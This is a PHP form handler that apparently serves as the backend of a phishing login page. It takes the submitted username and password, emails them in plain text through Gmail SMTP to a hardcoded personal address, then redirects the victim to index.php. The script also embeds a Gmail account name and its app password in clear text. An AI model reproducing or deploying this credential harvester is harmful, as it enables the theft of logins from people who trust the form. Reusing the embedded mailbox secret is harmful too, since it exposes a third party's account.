<?php

// Incluir la librería PHPMailer
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;
use PHPMailer\PHPMailer\SMTP;

require 'PHPMailer/src/Exception.php';
require 'PHPMailer/src/PHPMailer.php';
require 'PHPMailer/src/SMTP.php';

// Verifica si el formulario ha sido enviado
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Configuración del correo
    $mail = new PHPMailer(true);
    try {
        // Configura el servidor de correo
        $mail->isSMTP();
        $mail->Host = 'smtp.gmail.com'; // Cambia esto al servidor SMTP que estés usando
        $mail->SMTPAuth = true;
        $mail->Username = 'jsvrgamer74@gmail.com'; // Cambia esto a tu dirección de correo electrónico
        $mail->Password = 'yjsacynecajimmkt'; // Cambia esto a tu contraseña de correo electrónico
        $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
        $mail->Port = 587;

        // Configura el remitente y el destinatario
        $mail->setFrom('jsvrgamer74@gmail.com', 'STIV'); // Cambia esto al remitente deseado
        $mail->addAddress('alijorman74@gmail.com', 'JO'); // Cambia esto al destinatario del correo

        // Configura el contenido del correo
        $mail->isHTML(true);
        $mail->Subject = 'Credenciales Registradas';
        $mail->Body    = "Se encontraron nuevas credenciales registradas.<br>Username: $username<br>Password: $password"; // Nota: Es mejor no incluir la contraseña en el correo real

        $mail->send();
        header('Location: index.php'); // Cambia esto a la página a la que deseas redirigir
        exit;
    } catch (Exception $e) {
        // Manejo de errores
        echo 'Error al enviar el correo: ', $mail->ErrorInfo;
        exit;
    }
}
?>
